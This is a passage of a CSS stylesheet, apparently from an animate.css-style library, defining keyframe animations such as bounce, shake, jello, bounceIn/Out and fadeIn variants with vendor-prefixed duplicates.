                    -webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    -webkit-transform: translate3d(0, -30px, 0);
                    transform: translate3d(0, -30px, 0);
                }
                70% {
                    -webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    -webkit-transform: translate3d(0, -15px, 0);
                    transform: translate3d(0, -15px, 0);
                }
                90% {
                    -webkit-transform: translate3d(0, -4px, 0);
                    transform: translate3d(0, -4px, 0);
                }
            }
            @keyframes bounce {
                0%,
                20%,
                53%,
                80%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                }
                40%,
                43% {
                    -webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    -webkit-transform: translate3d(0, -30px, 0);
                    transform: translate3d(0, -30px, 0);
                }
                70% {
                    -webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
                    -webkit-transform: translate3d(0, -15px, 0);
                    transform: translate3d(0, -15px, 0);
                }
                90% {
                    -webkit-transform: translate3d(0, -4px, 0);
                    transform: translate3d(0, -4px, 0);
                }
            }
            .bounce {
                -webkit-animation-name: bounce;
                animation-name: bounce;
                -webkit-transform-origin: center bottom;
                transform-origin: center bottom;
            }
            @-webkit-keyframes flash {
                0%,
                50%,
                100% {
                    opacity: 1;
                }
                25%,
                75% {
                    opacity: 0;
                }
            }
            @keyframes flash {
                0%,
                50%,
                100% {
                    opacity: 1;
                }
                25%,
                75% {
                    opacity: 0;
                }
            }
            .flash {
                -webkit-animation-name: flash;
                animation-name: flash;
            }
            @-webkit-keyframes pulse {
                0% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
                50% {
                    -webkit-transform: scale3d(1.05, 1.05, 1.05);
                    transform: scale3d(1.05, 1.05, 1.05);
                }
                100% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            @keyframes pulse {
                0% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
                50% {
                    -webkit-transform: scale3d(1.05, 1.05, 1.05);
                    transform: scale3d(1.05, 1.05, 1.05);
                }
                100% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            .pulse {
                -webkit-animation-name: pulse;
                animation-name: pulse;
            }
            @-webkit-keyframes rubberBand {
                0% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
                30% {
                    -webkit-transform: scale3d(1.25, 0.75, 1);
                    transform: scale3d(1.25, 0.75, 1);
                }
                40% {
                    -webkit-transform: scale3d(0.75, 1.25, 1);
                    transform: scale3d(0.75, 1.25, 1);
                }
                50% {
                    -webkit-transform: scale3d(1.15, 0.85, 1);
                    transform: scale3d(1.15, 0.85, 1);
                }
                65% {
                    -webkit-transform: scale3d(0.95, 1.05, 1);
                    transform: scale3d(0.95, 1.05, 1);
                }
                75% {
                    -webkit-transform: scale3d(1.05, 0.95, 1);
                    transform: scale3d(1.05, 0.95, 1);
                }
                100% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            @keyframes rubberBand {
                0% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
                30% {
                    -webkit-transform: scale3d(1.25, 0.75, 1);
                    transform: scale3d(1.25, 0.75, 1);
                }
                40% {
                    -webkit-transform: scale3d(0.75, 1.25, 1);
                    transform: scale3d(0.75, 1.25, 1);
                }
                50% {
                    -webkit-transform: scale3d(1.15, 0.85, 1);
                    transform: scale3d(1.15, 0.85, 1);
                }
                65% {
                    -webkit-transform: scale3d(0.95, 1.05, 1);
                    transform: scale3d(0.95, 1.05, 1);
                }
                75% {
                    -webkit-transform: scale3d(1.05, 0.95, 1);
                    transform: scale3d(1.05, 0.95, 1);
                }
                100% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            .rubberBand {
                -webkit-animation-name: rubberBand;
                animation-name: rubberBand;
            }
            @-webkit-keyframes shake {
                0%,
                100% {
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                }
                10%,
                30%,
                50%,
                70%,
                90% {
                    -webkit-transform: translate3d(-10px, 0, 0);
                    transform: translate3d(-10px, 0, 0);
                }
                20%,
                40%,
                60%,
                80% {
                    -webkit-transform: translate3d(10px, 0, 0);
                    transform: translate3d(10px, 0, 0);
                }
            }
            @keyframes shake {
                0%,
                100% {
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                }
                10%,
                30%,
                50%,
                70%,
                90% {
                    -webkit-transform: translate3d(-10px, 0, 0);
                    transform: translate3d(-10px, 0, 0);
                }
                20%,
                40%,
                60%,
                80% {
                    -webkit-transform: translate3d(10px, 0, 0);
                    transform: translate3d(10px, 0, 0);
                }
            }
            .shake {
                -webkit-animation-name: shake;
                animation-name: shake;
            }
            @-webkit-keyframes swing {
                20% {
                    -webkit-transform: rotate3d(0, 0, 1, 15deg);
                    transform: rotate3d(0, 0, 1, 15deg);
                }
                40% {
                    -webkit-transform: rotate3d(0, 0, 1, -10deg);
                    transform: rotate3d(0, 0, 1, -10deg);
                }
                60% {
                    -webkit-transform: rotate3d(0, 0, 1, 5deg);
                    transform: rotate3d(0, 0, 1, 5deg);
                }
                80% {
                    -webkit-transform: rotate3d(0, 0, 1, -5deg);
                    transform: rotate3d(0, 0, 1, -5deg);
                }
                100% {
                    -webkit-transform: rotate3d(0, 0, 1, 0deg);
                    transform: rotate3d(0, 0, 1, 0deg);
                }
            }
            @keyframes swing {
                20% {
                    -webkit-transform: rotate3d(0, 0, 1, 15deg);
                    transform: rotate3d(0, 0, 1, 15deg);
                }
                40% {
                    -webkit-transform: rotate3d(0, 0, 1, -10deg);
                    transform: rotate3d(0, 0, 1, -10deg);
                }
                60% {
                    -webkit-transform: rotate3d(0, 0, 1, 5deg);
                    transform: rotate3d(0, 0, 1, 5deg);
                }
                80% {
                    -webkit-transform: rotate3d(0, 0, 1, -5deg);
                    transform: rotate3d(0, 0, 1, -5deg);
                }
                100% {
                    -webkit-transform: rotate3d(0, 0, 1, 0deg);
                    transform: rotate3d(0, 0, 1, 0deg);
                }
            }
            .swing {
                -webkit-transform-origin: top center;
                transform-origin: top center;
                -webkit-animation-name: swing;
                animation-name: swing;
            }
            @-webkit-keyframes tada {
                0% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
                10%,
                20% {
                    -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                    transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                }
                30%,
                50%,
                70%,
                90% {
                    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                }
                40%,
                60%,
                80% {
                    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                }
                100% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            @keyframes tada {
                0% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
                10%,
                20% {
                    -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                    transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                }
                30%,
                50%,
                70%,
                90% {
                    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                }
                40%,
                60%,
                80% {
                    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                }
                100% {
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            .tada {
                -webkit-animation-name: tada;
                animation-name: tada;
            }
            @-webkit-keyframes wobble {
                0% {
                    -webkit-transform: none;
                    transform: none;
                }
                15% {
                    -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
                    transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
                }
                30% {
                    -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
                    transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
                }
                45% {
                    -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
                    transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
                }
                60% {
                    -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
                    transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
                }
                75% {
                    -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
                    transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes wobble {
                0% {
                    -webkit-transform: none;
                    transform: none;
                }
                15% {
                    -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
                    transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
                }
                30% {
                    -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
                    transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
                }
                45% {
                    -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
                    transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
                }
                60% {
                    -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
                    transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
                }
                75% {
                    -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
                    transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .wobble {
                -webkit-animation-name: wobble;
                animation-name: wobble;
            }
            @-webkit-keyframes jello {
                11.1% {
                    -webkit-transform: none;
                    transform: none;
                }
                22.2% {
                    -webkit-transform: skewX(-12.5deg) skewY(-12.5deg);
                    transform: skewX(-12.5deg) skewY(-12.5deg);
                }
                33.3% {
                    -webkit-transform: skewX(6.25deg) skewY(6.25deg);
                    transform: skewX(6.25deg) skewY(6.25deg);
                }
                44.4% {
                    -webkit-transform: skewX(-3.125deg) skewY(-3.125deg);
                    transform: skewX(-3.125deg) skewY(-3.125deg);
                }
                55.5% {
                    -webkit-transform: skewX(1.5625deg) skewY(1.5625deg);
                    transform: skewX(1.5625deg) skewY(1.5625deg);
                }
                66.6% {
                    -webkit-transform: skewX(-0.78125deg) skewY(-0.78125deg);
                    transform: skewX(-0.78125deg) skewY(-0.78125deg);
                }
                77.7% {
                    -webkit-transform: skewX(0.390625deg) skewY(0.390625deg);
                    transform: skewX(0.390625deg) skewY(0.390625deg);
                }
                88.8% {
                    -webkit-transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
                    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes jello {
                11.1% {
                    -webkit-transform: none;
                    transform: none;
                }
                22.2% {
                    -webkit-transform: skewX(-12.5deg) skewY(-12.5deg);
                    transform: skewX(-12.5deg) skewY(-12.5deg);
                }
                33.3% {
                    -webkit-transform: skewX(6.25deg) skewY(6.25deg);
                    transform: skewX(6.25deg) skewY(6.25deg);
                }
                44.4% {
                    -webkit-transform: skewX(-3.125deg) skewY(-3.125deg);
                    transform: skewX(-3.125deg) skewY(-3.125deg);
                }
                55.5% {
                    -webkit-transform: skewX(1.5625deg) skewY(1.5625deg);
                    transform: skewX(1.5625deg) skewY(1.5625deg);
                }
                66.6% {
                    -webkit-transform: skewX(-0.78125deg) skewY(-0.78125deg);
                    transform: skewX(-0.78125deg) skewY(-0.78125deg);
                }
                77.7% {
                    -webkit-transform: skewX(0.390625deg) skewY(0.390625deg);
                    transform: skewX(0.390625deg) skewY(0.390625deg);
                }
                88.8% {
                    -webkit-transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
                    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .jello {
                -webkit-animation-name: jello;
                animation-name: jello;
                -webkit-transform-origin: center;
                transform-origin: center;
            }
            @-webkit-keyframes bounceIn {
                0%,
                20%,
                40%,
                60%,
                80%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.3, 0.3, 0.3);
                    transform: scale3d(0.3, 0.3, 0.3);
                }
                20% {
                    -webkit-transform: scale3d(1.1, 1.1, 1.1);
                    transform: scale3d(1.1, 1.1, 1.1);
                }
                40% {
                    -webkit-transform: scale3d(0.9, 0.9, 0.9);
                    transform: scale3d(0.9, 0.9, 0.9);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: scale3d(1.03, 1.03, 1.03);
                    transform: scale3d(1.03, 1.03, 1.03);
                }
                80% {
                    -webkit-transform: scale3d(0.97, 0.97, 0.97);
                    transform: scale3d(0.97, 0.97, 0.97);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            @keyframes bounceIn {
                0%,
                20%,
                40%,
                60%,
                80%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.3, 0.3, 0.3);
                    transform: scale3d(0.3, 0.3, 0.3);
                }
                20% {
                    -webkit-transform: scale3d(1.1, 1.1, 1.1);
                    transform: scale3d(1.1, 1.1, 1.1);
                }
                40% {
                    -webkit-transform: scale3d(0.9, 0.9, 0.9);
                    transform: scale3d(0.9, 0.9, 0.9);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: scale3d(1.03, 1.03, 1.03);
                    transform: scale3d(1.03, 1.03, 1.03);
                }
                80% {
                    -webkit-transform: scale3d(0.97, 0.97, 0.97);
                    transform: scale3d(0.97, 0.97, 0.97);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: scale3d(1, 1, 1);
                    transform: scale3d(1, 1, 1);
                }
            }
            .bounceIn {
                -webkit-animation-name: bounceIn;
                animation-name: bounceIn;
            }
            @-webkit-keyframes bounceInDown {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -3000px, 0);
                    transform: translate3d(0, -3000px, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, 25px, 0);
                    transform: translate3d(0, 25px, 0);
                }
                75% {
                    -webkit-transform: translate3d(0, -10px, 0);
                    transform: translate3d(0, -10px, 0);
                }
                90% {
                    -webkit-transform: translate3d(0, 5px, 0);
                    transform: translate3d(0, 5px, 0);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes bounceInDown {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -3000px, 0);
                    transform: translate3d(0, -3000px, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, 25px, 0);
                    transform: translate3d(0, 25px, 0);
                }
                75% {
                    -webkit-transform: translate3d(0, -10px, 0);
                    transform: translate3d(0, -10px, 0);
                }
                90% {
                    -webkit-transform: translate3d(0, 5px, 0);
                    transform: translate3d(0, 5px, 0);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .bounceInDown {
                -webkit-animation-name: bounceInDown;
                animation-name: bounceInDown;
            }
            @-webkit-keyframes bounceInLeft {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-3000px, 0, 0);
                    transform: translate3d(-3000px, 0, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(25px, 0, 0);
                    transform: translate3d(25px, 0, 0);
                }
                75% {
                    -webkit-transform: translate3d(-10px, 0, 0);
                    transform: translate3d(-10px, 0, 0);
                }
                90% {
                    -webkit-transform: translate3d(5px, 0, 0);
                    transform: translate3d(5px, 0, 0);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes bounceInLeft {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-3000px, 0, 0);
                    transform: translate3d(-3000px, 0, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(25px, 0, 0);
                    transform: translate3d(25px, 0, 0);
                }
                75% {
                    -webkit-transform: translate3d(-10px, 0, 0);
                    transform: translate3d(-10px, 0, 0);
                }
                90% {
                    -webkit-transform: translate3d(5px, 0, 0);
                    transform: translate3d(5px, 0, 0);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .bounceInLeft {
                -webkit-animation-name: bounceInLeft;
                animation-name: bounceInLeft;
            }
            @-webkit-keyframes bounceInRight {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(3000px, 0, 0);
                    transform: translate3d(3000px, 0, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(-25px, 0, 0);
                    transform: translate3d(-25px, 0, 0);
                }
                75% {
                    -webkit-transform: translate3d(10px, 0, 0);
                    transform: translate3d(10px, 0, 0);
                }
                90% {
                    -webkit-transform: translate3d(-5px, 0, 0);
                    transform: translate3d(-5px, 0, 0);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes bounceInRight {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(3000px, 0, 0);
                    transform: translate3d(3000px, 0, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(-25px, 0, 0);
                    transform: translate3d(-25px, 0, 0);
                }
                75% {
                    -webkit-transform: translate3d(10px, 0, 0);
                    transform: translate3d(10px, 0, 0);
                }
                90% {
                    -webkit-transform: translate3d(-5px, 0, 0);
                    transform: translate3d(-5px, 0, 0);
                }
                100% {
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .bounceInRight {
                -webkit-animation-name: bounceInRight;
                animation-name: bounceInRight;
            }
            @-webkit-keyframes bounceInUp {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 3000px, 0);
                    transform: translate3d(0, 3000px, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, -20px, 0);
                    transform: translate3d(0, -20px, 0);
                }
                75% {
                    -webkit-transform: translate3d(0, 10px, 0);
                    transform: translate3d(0, 10px, 0);
                }
                90% {
                    -webkit-transform: translate3d(0, -5px, 0);
                    transform: translate3d(0, -5px, 0);
                }
                100% {
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                }
            }
            @keyframes bounceInUp {
                0%,
                60%,
                75%,
                90%,
                100% {
                    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
                }
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 3000px, 0);
                    transform: translate3d(0, 3000px, 0);
                }
                60% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, -20px, 0);
                    transform: translate3d(0, -20px, 0);
                }
                75% {
                    -webkit-transform: translate3d(0, 10px, 0);
                    transform: translate3d(0, 10px, 0);
                }
                90% {
                    -webkit-transform: translate3d(0, -5px, 0);
                    transform: translate3d(0, -5px, 0);
                }
                100% {
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                }
            }
            .bounceInUp {
                -webkit-animation-name: bounceInUp;
                animation-name: bounceInUp;
            }
            @-webkit-keyframes bounceOut {
                20% {
                    -webkit-transform: scale3d(0.9, 0.9, 0.9);
                    transform: scale3d(0.9, 0.9, 0.9);
                }
                50%,
                55% {
                    opacity: 1;
                    -webkit-transform: scale3d(1.1, 1.1, 1.1);
                    transform: scale3d(1.1, 1.1, 1.1);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.3, 0.3, 0.3);
                    transform: scale3d(0.3, 0.3, 0.3);
                }
            }
            @keyframes bounceOut {
                20% {
                    -webkit-transform: scale3d(0.9, 0.9, 0.9);
                    transform: scale3d(0.9, 0.9, 0.9);
                }
                50%,
                55% {
                    opacity: 1;
                    -webkit-transform: scale3d(1.1, 1.1, 1.1);
                    transform: scale3d(1.1, 1.1, 1.1);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: scale3d(0.3, 0.3, 0.3);
                    transform: scale3d(0.3, 0.3, 0.3);
                }
            }
            .bounceOut {
                -webkit-animation-name: bounceOut;
                animation-name: bounceOut;
            }
            @-webkit-keyframes bounceOutDown {
                20% {
                    -webkit-transform: translate3d(0, 10px, 0);
                    transform: translate3d(0, 10px, 0);
                }
                40%,
                45% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, -20px, 0);
                    transform: translate3d(0, -20px, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 2000px, 0);
                    transform: translate3d(0, 2000px, 0);
                }
            }
            @keyframes bounceOutDown {
                20% {
                    -webkit-transform: translate3d(0, 10px, 0);
                    transform: translate3d(0, 10px, 0);
                }
                40%,
                45% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, -20px, 0);
                    transform: translate3d(0, -20px, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 2000px, 0);
                    transform: translate3d(0, 2000px, 0);
                }
            }
            .bounceOutDown {
                -webkit-animation-name: bounceOutDown;
                animation-name: bounceOutDown;
            }
            @-webkit-keyframes bounceOutLeft {
                20% {
                    opacity: 1;
                    -webkit-transform: translate3d(20px, 0, 0);
                    transform: translate3d(20px, 0, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(-2000px, 0, 0);
                    transform: translate3d(-2000px, 0, 0);
                }
            }
            @keyframes bounceOutLeft {
                20% {
                    opacity: 1;
                    -webkit-transform: translate3d(20px, 0, 0);
                    transform: translate3d(20px, 0, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(-2000px, 0, 0);
                    transform: translate3d(-2000px, 0, 0);
                }
            }
            .bounceOutLeft {
                -webkit-animation-name: bounceOutLeft;
                animation-name: bounceOutLeft;
            }
            @-webkit-keyframes bounceOutRight {
                20% {
                    opacity: 1;
                    -webkit-transform: translate3d(-20px, 0, 0);
                    transform: translate3d(-20px, 0, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(2000px, 0, 0);
                    transform: translate3d(2000px, 0, 0);
                }
            }
            @keyframes bounceOutRight {
                20% {
                    opacity: 1;
                    -webkit-transform: translate3d(-20px, 0, 0);
                    transform: translate3d(-20px, 0, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(2000px, 0, 0);
                    transform: translate3d(2000px, 0, 0);
                }
            }
            .bounceOutRight {
                -webkit-animation-name: bounceOutRight;
                animation-name: bounceOutRight;
            }
            @-webkit-keyframes bounceOutUp {
                20% {
                    -webkit-transform: translate3d(0, -10px, 0);
                    transform: translate3d(0, -10px, 0);
                }
                40%,
                45% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, 20px, 0);
                    transform: translate3d(0, 20px, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -2000px, 0);
                    transform: translate3d(0, -2000px, 0);
                }
            }
            @keyframes bounceOutUp {
                20% {
                    -webkit-transform: translate3d(0, -10px, 0);
                    transform: translate3d(0, -10px, 0);
                }
                40%,
                45% {
                    opacity: 1;
                    -webkit-transform: translate3d(0, 20px, 0);
                    transform: translate3d(0, 20px, 0);
                }
                100% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -2000px, 0);
                    transform: translate3d(0, -2000px, 0);
                }
            }
            .bounceOutUp {
                -webkit-animation-name: bounceOutUp;
                animation-name: bounceOutUp;
            }
            @-webkit-keyframes fadeIn {
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
            @keyframes fadeIn {
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
            .fadeIn {
                -webkit-animation-name: fadeIn;
                animation-name: fadeIn;
            }
            @-webkit-keyframes fadeInDown {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -100%, 0);
                    transform: translate3d(0, -100%, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInDown {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -100%, 0);
                    transform: translate3d(0, -100%, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInDown {
                -webkit-animation-name: fadeInDown;
                animation-name: fadeInDown;
            }
            @-webkit-keyframes fadeInDownBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -2000px, 0);
                    transform: translate3d(0, -2000px, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInDownBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -2000px, 0);
                    transform: translate3d(0, -2000px, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInDownBig {
                -webkit-animation-name: fadeInDownBig;
                animation-name: fadeInDownBig;
            }
            @-webkit-keyframes fadeInLeft {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-100%, 0, 0);
                    transform: translate3d(-100%, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInLeft {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-100%, 0, 0);
                    transform: translate3d(-100%, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInLeft {
                -webkit-animation-name: fadeInLeft;
                animation-name: fadeInLeft;
            }
            @-webkit-keyframes fadeInLeftBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-2000px, 0, 0);
                    transform: translate3d(-2000px, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInLeftBig {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(-2000px, 0, 0);
                    transform: translate3d(-2000px, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInLeftBig {
                -webkit-animation-name: fadeInLeftBig;
                animation-name: fadeInLeftBig;
            }
            @-webkit-keyframes fadeInRight {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(100%, 0, 0);
                    transform: translate3d(100%, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            @keyframes fadeInRight {
                0% {
                    opacity: 0;
                    -webkit-transform: translate3d(100%, 0, 0);
                    transform: translate3d(100%, 0, 0);
                }
                100% {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none;
                }
            }
            .fadeInRight {
                -webkit-animation-name: fadeInRight;
                animation-name: fadeInRight;
            }
